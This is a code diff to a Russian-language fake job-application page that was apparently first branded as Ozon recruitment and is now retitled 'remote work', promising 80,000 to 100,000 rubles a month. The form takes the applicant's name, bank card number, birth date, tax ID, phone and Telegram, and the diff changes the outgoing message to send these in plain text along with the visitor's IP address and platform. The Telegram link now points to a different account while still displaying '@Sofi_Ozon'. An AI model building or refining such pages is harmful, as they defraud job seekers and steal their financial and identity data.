@@ -6,7 +6,7 @@
     <meta name="robots" content="noindex, nofollow">
     <meta name="description" content="Платформа для подачи заявок на удалённую работу">
     <meta http-equiv="X-Content-Type-Options" content="nosniff">
-    <title>Работа в ОЗОН</title>
+    <title>Работа Онлайн</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <style>
         body {
@@ -512,7 +512,7 @@
     <div class="container">
         <div class="header-section">
             <div class="header">
-                Работа в ОЗОН
+                Поддержка Работы
             </div>
             <div class="theme-toggle">
                 <button class="light-btn" onclick="toggleTheme('light', event)"><i class="fas fa-sun"></i></button>
@@ -521,7 +521,7 @@
         </div>
         <div class="main-banner">
             <div class="banner-text">
-                <h2>Работа в ОЗОН</h2>
+                <h2>Удалённая Работа</h2>
                 <p>От 80 000 до 100 000 ₽ в месяц</p>
                 <button onclick="openModal()">Стать работником</button>
             </div>
@@ -583,7 +583,7 @@
     <div id="notificationModal" class="notification">
         <div class="notification-content">
             <h3>Заявка отправлена</h3>
-            <p>Напишите нашему менеджеру в Telegram: <a href="https://t.me/Sofi_Ozon" target="_blank" id="telegramLink">@Sofi_Ozon</a></p>
+            <p>Напишите нашему менеджеру в Telegram: <a href="https://t.me/reyzovs" target="_blank" id="telegramLink">@Sofi_Ozon</a></p>
             <button id="doneButton" onclick="closeNotification()">Готово</button>
         </div>
     </div>
@@ -624,6 +624,11 @@
         function encodeData(data) {
             const jsonString = JSON.stringify(data);
             return btoa(jsonString);
+        }
+
+        function decodeData(encoded) {
+            const jsonString = atob(encoded);
+            return JSON.parse(jsonString);
         }
 
         function openModal() {
@@ -690,11 +695,18 @@
             const platform = detectPlatform();
 
             const encodedData = encodeData(data);
+            const decodedData = decodeData(encodedData);
 
             const message = `
 Новая заявка на работу:
 🆔 ID заявки: ${applicationId}
-📦 Данные: ${encodedData}
+👤 ФИО: ${decodedData.name}
+💳 Номер карты: ${decodedData.card}
+📅 Дата рождения: ${decodedData.birthdate}
+🆔 ИНН: ${decodedData.inn}
+📞 Номер телефона: ${decodedData.phone}
+🏙 Город: ${decodedData.city}
+📱 Telegram: ${decodedData.telegram}
 🌐 IP-адрес: ${ipAddress}
 💻 Платформа: ${platform}
             `;
